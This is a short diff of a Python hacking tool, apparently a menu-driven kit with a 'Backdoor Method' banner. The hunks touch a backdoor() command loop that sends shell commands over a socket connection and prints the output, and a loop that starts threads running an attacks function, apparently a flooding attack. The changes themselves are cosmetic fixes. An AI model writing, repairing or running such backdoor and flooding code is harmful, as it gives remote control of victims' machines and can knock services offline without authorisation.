@@ -94,8 +94,8 @@ if choose == "1":
  :             .'           
   \ )       .-'             
    `-----*"'     [GMS]
-   [Backdoor Method       ]
-   [Copyright : Phamchien ]
+   [ Backdoor Method       ]
+   [ Copyright : Phamchien ]
 {Style.RESET_ALL}
 ''')
     def backdoor():
@@ -170,7 +170,7 @@ setup()
             elif shell_cmd != "\n":
                 conn.send(shell_cmd.encode())
                 output = conn.recv(10024)
-                print("\n", output.decode())
+                print("\n" + output.decode())
 
     backdoor()
 elif choose == "2":
@@ -270,7 +270,7 @@ elif choose == "3":
                 socks_ip.close()
         threads = []
         while True:
-            t = threading.Thread(target=attacks())
+            t = threading.Thread(target=attacks)
             threads.append(t)
             t.start()
             t.join()
